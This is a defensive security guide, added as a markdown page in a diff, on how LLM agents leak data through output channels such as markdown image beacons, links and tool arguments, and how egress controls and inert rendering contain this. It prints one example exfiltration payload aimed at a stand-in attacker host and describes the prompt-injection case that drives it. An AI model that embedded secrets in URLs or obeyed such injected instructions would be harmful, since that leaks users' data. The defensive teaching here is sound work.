@@ -1,0 +1,51 @@
+---
+title: "Output Safety & Data Exfiltration"
+slug: "exfiltration-and-output"
+number: "07"
+description: "Exfiltration via tool calls, links, and markdown image beacons; the danger of rendering untrusted model output as live HTML."
+relatedPatterns: ["safety-net", "negative-space"]
+relatedTopics: ["hooks", "mcp"]
+published: true
+keywords: ["AI data exfiltration", "markdown image exfiltration", "LLM output rendering", "agent exfil channel", "untrusted model output"]
+---
+
+# Output Safety & Data Exfiltration
+
+Containing what an agent can *do* ([Permission Architecture](/learn/security/permission-architecture)) is only half the boundary. The other half is what an agent can *say*, and where that output goes next. Exfiltration does not need a shell or a write tool. It needs a channel that carries bytes outward and a model that can be steered to fill it. Both are easier to supply than teams expect, and the model has already read the attacker's instructions on how to use them.
+
+## The Channel Is Usually Benign-Looking
+
+Exfiltration rarely looks like exfiltration. It looks like the agent being helpful:
+
+| Channel | How data leaves | Why it is missed |
+|---------|-----------------|------------------|
+| Markdown image | `![](https://attacker/x?d=<secret>)` — the render fetches it | Looks like a broken image, fires on view |
+| Markdown link | Secret encoded in a URL the user is nudged to click | Reads as a normal citation |
+| Tool argument | Sensitive data placed into a fetch/search/webhook call | The tool was "allowed," so the call looks legitimate |
+| Verbose answer | The model simply restates a secret it read into the reply | Not even an attack — just disclosure with no exfil needed |
+
+The markdown image beacon is the canonical case: an [injected instruction](/learn/security/prompt-injection) tells the model to read a secret and embed it in an image URL. No write tool, no shell. The exfil happens in the *renderer*, the moment the output is displayed. The agent looked perfectly well-behaved.
+
+## Output Is an Injection Sink, Not a Trophy
+
+The reflex is to trust output because it came from your model. But under injection it came from an attacker, laundered through your model. Wherever it flows, that destination is a fresh, hostile boundary — the [output boundary](/learn/security/threat-model) from the threat model:
+
+- **Rendered as HTML/markdown** — auto-loading images and active links are exfil and click targets. Render untrusted output as inert text, or strip outbound image/link fetches. Never mount model output into a live DOM unsanitized.
+- **Fed to another agent or [MCP](/learn/toolkit/mcp) tool** — one agent's output is the next agent's untrusted input. The chain does not launder it clean; it carries the payload forward.
+- **Executed** — output used as a command or query is the highest-severity sink. Treat it exactly as you would a string from an anonymous user, because that is its real provenance.
+
+## Make the Outbound Boundary Explicit
+
+Egress is a control point, not an afterthought. The [Safety Net](/learn/patterns/safety-net) pattern applies to what leaves, not only to what the agent does internally:
+
+- An egress allow-list at the tool/network layer: a request to an unknown host is the signal, and it should fail closed.
+- [Hooks](/learn/toolkit/hooks) that inspect tool arguments for high-entropy or known-secret patterns before the call is permitted to leave.
+- [Negative Space](/learn/patterns/negative-space) in the system prompt — naming "never place credentials or file contents into a URL" raises the bar. It is a speed bump, not the wall; the wall is the egress control.
+
+## The Tradeoff
+
+Hardening output degrades the product. Inert rendering means no inline diagrams and no clickable citations — features users want. An egress allow-list breaks the moment a legitimate new domain appears, and a model that must caveat every answer to avoid restating sensitive data is a worse assistant. You are trading richness and flow for containment, every time, and a team that ships the rich rendering has made that trade — usually without noticing it was a trade.
+
+## When Not To Sanitize
+
+If output is consumed only by the same trusted human who issued the prompt, displayed as plain text, never rendered live, never chained into another tool, and never executed — there is no exfil sink and a sanitization layer guards an exit that does not exist. The risk scales with the number and power of downstream sinks. The largest sink most teams never enumerate is the one others control: [Supply Chain, Audit & Governance](/learn/security/supply-chain-and-audit).
